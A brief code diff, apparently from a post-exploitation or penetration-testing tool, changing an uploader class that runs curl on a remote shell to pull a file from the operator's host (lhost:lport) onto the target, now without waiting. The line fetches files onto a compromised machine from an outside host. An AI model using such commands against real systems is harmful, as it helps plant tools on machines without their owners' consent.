@@ -18,4 +18,6 @@ class CurlUploader(HTTPUploader):
         curl = self.pty.which("curl")
         remote_path = shlex.quote(self.remote_path)
 
-        self.pty.run(f"{curl} --output {remote_path} http://{lhost}:{lport}")
+        self.pty.run(
+            f"{curl} --output {remote_path} http://{lhost}:{lport}", wait=False
+        )
